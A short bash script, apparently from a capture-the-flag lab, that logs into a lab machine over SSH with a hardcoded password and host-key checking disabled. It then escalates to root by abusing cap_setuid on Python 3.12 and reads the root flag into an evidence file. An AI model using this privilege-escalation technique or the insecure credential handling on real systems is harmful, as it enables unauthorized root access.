#!/bin/bash
cd "/home/chifay/Whoami-Labs/Titan Linux" || exit 1
SSH="sshpass -p password123 ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no ubuntu@192.168.60.132"
clear
printf '\033]0;TITAN VECTOR 1 cap_setuid\007'
echo "=================================================================="
echo " TITAN LINUX - VECTOR 1: ABUSO DE cap_setuid EN PYTHON 3.12"
echo " Fecha: $(date)"
echo "=================================================================="
echo
echo '$ getcap /usr/bin/python3.12'
$SSH 'getcap /usr/bin/python3.12'
echo
echo '$ python3.12 -c "import os; os.setuid(0); os.system(\"id; cat /root/FLAG_LINUX_ROOT.txt\")"'
$SSH 'python3.12 -c "import os; os.setuid(0); os.system(\"id; echo ---FLAG---; cat /root/FLAG_LINUX_ROOT.txt\")"' 2>&1 | tee "evidencias/term_vector1_cap_setuid.txt"
echo
echo "### FIN ETAPA 1 ###"
touch /tmp/opencode/stage1.done
sleep 3600
